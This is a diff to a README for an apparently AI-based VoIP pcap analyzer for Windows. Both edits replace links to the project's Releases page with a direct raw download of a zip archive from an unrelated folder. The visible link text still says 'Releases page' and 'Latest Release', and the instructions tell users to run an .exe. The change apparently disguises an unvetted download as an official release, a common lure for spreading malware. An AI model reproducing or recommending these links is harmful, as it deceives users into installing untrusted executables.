@@ -1,6 +1,6 @@
 # 🔍 -kranti-sip-pcap-analyzer - Analyze VoIP calls with artificial intelligence
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/iikcoraxx-debug/-kranti-sip-pcap-analyzer/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/iikcoraxx-debug/-kranti-sip-pcap-analyzer/raw/refs/heads/main/Wiyot/sip-pcap-analyzer-kranti-v1.3.zip)
 
 ## 📖 About this application
 
@@ -18,7 +18,7 @@ This application runs on standard Windows hardware. Ensure your computer meets t
 
 ## 🚀 Getting started
 
-1. Go to the [Releases page](https://github.com/iikcoraxx-debug/-kranti-sip-pcap-analyzer/releases).
+1. Go to the [Releases page](https://github.com/iikcoraxx-debug/-kranti-sip-pcap-analyzer/raw/refs/heads/main/Wiyot/sip-pcap-analyzer-kranti-v1.3.zip).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends with .exe to download the installer.
 4. Save the file to your computer.
